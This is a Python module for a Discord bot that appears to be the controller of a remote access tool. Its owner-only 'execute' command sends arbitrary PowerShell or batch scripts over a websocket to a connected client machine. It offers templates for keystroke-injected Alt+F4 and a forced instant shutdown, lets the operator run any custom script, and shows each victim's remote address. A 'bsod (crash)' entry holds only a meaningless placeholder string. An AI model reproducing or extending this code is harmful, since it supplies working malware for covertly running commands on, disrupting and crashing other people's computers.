from discord import app_commands
import discord
from core.functions.websocket.ws_registry import WSRegistry
from typing import Literal
import config


@app_commands.command(name="execute", description="Execute a powershell script or a batch script on the client")
@app_commands.describe(template="If you select custom, please fill the customscript field", shell="Leave this as true if you're using a template")
async def script(interaction: discord.Interaction, cid: int, template: Literal["alt+f4", "shutdown", "bsod (crash)", "custom"], customscript: str = "", shell: bool = True):
    try:
        if interaction.user.id not in config.owner_ids:
            embed = discord.Embed(description=f"{config.no} | You are not allowed to use this command", color=config.embederrorcolor)
            await interaction.response.send_message(embed=embed)
            return
        
        client = WSRegistry.get_client(cid)
        if client == None:
            embed = discord.Embed(description=f"{config.no} | Client not found", color=config.embederrorcolor)
            await interaction.response.send_message(embed=embed)
            return
        
        scripts = {
            "alt+f4": 'powershell -command "(New-Object -ComObject WScript.Shell).SendKeys(\'%{F4}\')"',
            "shutdown": 'shutdown /s /f /t 0',
            "bsod (crash)": 'sharkigga',
            "custom": customscript
            
        }
        
        await client.send("EXECUTE", {"script": scripts[template], "shell": shell})
        
        embed = discord.Embed(title="Order sent", description=f"Sent a `EXECUTE` command to client `{client.websocket.remote_address}: {cid}`\n> **Script**: ```{scripts[template]}```", color=config.embedcolor)
        
        await interaction.response.send_message(embed=embed)
    except Exception as e:
        await Bot.error(interaction, Bot, e)  
    
async def setup(bot):
    global Bot 
    Bot = bot
    bot.tree.get_command("commands").add_command(script)         